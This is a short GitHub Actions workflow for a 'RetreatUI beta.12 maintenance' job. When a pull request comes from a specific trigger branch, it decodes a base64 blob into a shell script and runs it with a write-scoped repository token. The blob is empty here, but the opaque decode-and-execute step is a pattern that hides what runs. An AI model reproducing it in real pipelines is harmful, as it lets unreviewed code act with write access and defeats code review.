name: Run RetreatUI beta.12 maintenance

on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  actions: write
  pull-requests: write

concurrency:
  group: retreatui-beta12-direct-maintenance
  cancel-in-progress: false

jobs:
  maintain:
    if: github.event.pull_request.head.ref == 'maintenance/beta12-trigger'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout main
        uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 0
      - name: Run beta.12 maintenance
        env:
          GH_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          printf '%s' '' | base64 --decode > /tmp/beta12-maintenance.sh
          chmod +x /tmp/beta12-maintenance.sh
          /tmp/beta12-maintenance.sh
